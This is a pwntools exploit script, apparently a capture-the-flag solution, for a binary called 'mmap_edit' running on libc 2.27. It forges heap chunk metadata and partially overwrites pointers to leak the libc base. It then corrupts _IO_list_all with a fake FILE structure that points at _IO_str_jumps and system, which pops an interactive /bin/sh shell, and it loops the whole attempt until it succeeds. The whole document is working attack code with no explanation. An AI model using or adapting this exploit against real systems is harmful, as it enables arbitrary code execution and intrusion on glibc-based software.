#!/usr/bin/python3
from pwn import *
elf = ELF('./mmap_edit')
libc = ELF('./libc-2.27.so')
context.log_level = 'debug'
sh = process(['./mmap_edit'], env={"LD_PRELOAD":"./libc-2.27.so"})
def edit(start, size, content):
    sh.recvuntil('3. exit')
    sh.sendline('1')
    sh.recvuntil('input start')
    sh.sendline(str(start))
    sh.recvuntil('size')
    sh.sendline(str(size))
    sh.recvuntil('content')
    sh.send(content)

def dele(start):
    sh.recvuntil('3. exit')
    sh.sendline('2')
    sh.recvuntil('input start')
    sh.sendline(str(start))

def back_door(size):
    sh.recvuntil('3. exit')
    sh.sendline('666')
    sh.recvuntil('size ?')
    sh.sendline(str(size))
def exp():
    global sh
    #sh = remote('localhost', 10081)
    sh = process(['./mmap_edit'], env={"LD_PRELOAD":"./libc-2.27.so"})
    back_door(0x100)
    edit(0, 0x10, p64(0) + p64(0x621))
    edit(0x620, 0x30, p64(0) + p64(0x21) + '\x00' * 16 + p64(0) + p64(0x631))
    edit(0xc70, 0x30, p64(0) + p64(0x21) + '\x00' * 16 + p64(0) + p64(0x21))
    #gdb.attach(sh)
    dele(0x10)
    back_door(0x700)
    dele(0x650)
    #pause()
    edit(0x18, 2, '\x50\x17')
    #gdb.attach(sh)
    back_door(0x700)

    edit(0, 0x10, p64(0) + p64(0x421))
    edit(0x420, 0x30, p64(0) + p64(0x21) + '\x00' * 16 + p64(0) + p64(0x431))
    edit(0x870, 0x30, p64(0) + p64(0x21) + '\x00' * 16 + p64(0) + p64(0x21))
    dele(0x10)
    back_door(0x800)

    dele(0x450)
    edit(0x18, 2, '\x69\x17')
    back_door(0x800)
    libc_base = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x3ed8b0
    print(hex(libc_base))
    
    pause()

    one_gadget  = libc_base + 0x4f322
    str_jumps = 0x3e8360 + libc_base
    IO_list_all = 0x3ec660 + libc_base
    #pause()
    system = libc_base + libc.sym['system']
    bin_sh_addr = libc_base + libc.search('/bin/sh').next()
    bin_sh_addr = (bin_sh_addr - 100) / 2
    print(hex(libc_base))
    #gdb.attach(sh)
    edit(0, 0x10, p64(0) + p64(0x421))
    edit(0x60, 0x30, p64(0) + p64(0x21))
    edit(0x420, 0x30, p64(0) + p64(0x21) + '\x00' * 16 + p64(0) + p64(0x21))
    dele(0x10)
    edit(0, 0x10, p64(0) + p64(0x61))
    back_door(0x800)
    edit(0, 0x10, p64(0) + p64(0x921))
    edit(0x920, 0x30, p64(0) + p64(0x21) + '\x00' * 16 + p64(0) + p64(0x21))
    dele(0x10)
    edit(0x18, 8, p64(IO_list_all - 0x10))
    back_door(0x910)
    fake_io = p64(0) * 5 + p64(bin_sh_addr + 0x100) + p64(0) + p64(0) + p64(bin_sh_addr)
    fake_io = fake_io.ljust(0xd8, '\x00') + p64(str_jumps) + p64(system)
    edit(0, len(fake_io), fake_io)
    #gdb.attach(sh)
    sh.sendline('3')
    sh.interactive()
while True:
    try:
        exp()
    except:
        sh.close()
        continue
